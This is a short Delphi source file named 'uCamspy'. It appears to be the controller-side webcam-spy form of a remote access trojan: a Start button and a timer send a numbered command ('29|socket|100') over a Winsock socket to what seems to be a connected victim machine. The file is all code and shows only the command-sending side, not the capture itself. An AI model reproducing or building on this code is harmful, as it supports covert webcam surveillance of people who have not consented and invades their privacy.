unit uCamspy;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, Buttons, PngBitBtn, ExtCtrls,winsock;

type
  TForm7 = class(TForm)
    stat1: TStatusBar;
    PngBitBtn1: TPngBitBtn;
    pb1: TProgressBar;
    img1: TImage;
    tmr1: TTimer;
    btn1: TButton;

    procedure PngBitBtn1Click(Sender: TObject);
    procedure tmr1Timer(Sender: TObject);
  private
    { Private declarations }
  public
    sStop:boolean;
    { Public declarations }
  end;

var
  Form7: TForm7;

implementation

{$R *.dfm}

procedure TForm7.PngBitBtn1Click(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
if PngBitBtn1.Caption = 'Start' then begin
sStop := False;
Data := '29|' + Stat1.Panels[0].Text +  '|100'+ #10;
Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
PngBitBtn1.Caption := 'Stop';
tmr1.Enabled := True;
end else begin
  sStop := True;
  tmr1.Enabled := false;
  PngBitBtn1.Caption := 'Start';
end;
end;

procedure TForm7.tmr1Timer(Sender: TObject);
var
sock:tSocket;
Data:string;
begin
if btn1.Enabled = false then begin
  btn1.Enabled := True;
  Data := '29|' + Stat1.Panels[0].Text +  '|100'+ #10;
Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
end;
end;

end.
